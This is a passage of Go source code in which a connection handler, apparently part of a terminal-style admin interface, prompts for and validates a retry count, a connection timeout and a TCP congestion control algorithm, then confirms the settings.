		this.conn.Write([]byte("\r\n\x1b[1;36mRetry Count (default 3): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: number of retries on failure)\x1b[0m\r\n"))
		retryStr, _ := this.ReadLine(false)
		if retryStr != "" {
			if retry, err := strconv.Atoi(strings.TrimSpace(retryStr)); err == nil && retry >= 0 {
				config.RetryCount = retry
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mConnection Timeout in milliseconds (default 5000): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: timeout before considering connection failed)\x1b[0m\r\n"))
		timeoutStr, _ := this.ReadLine(false)
		if timeoutStr != "" {
			if timeout, err := strconv.Atoi(strings.TrimSpace(timeoutStr)); err == nil && timeout > 0 {
				config.ConnectionTimeout = timeout
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mCongestion Control Algorithm (reno/cubic/bbr/random, default random): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: TCP congestion control algorithm emulation)\x1b[0m\r\n"))
		congestionStr, _ := this.ReadLine(false)
		if congestionStr != "" {
			alg := strings.ToLower(strings.TrimSpace(congestionStr))
			if alg == "reno" || alg == "cubic" || alg == "bbr" || alg == "random" {
				config.CongestionControl = alg
			}
		}
	}
	this.conn.Write([]byte("\r\n\x1b[1;32mSettings configured!\r\n"))
	time.Sleep(1 * time.Second)
}
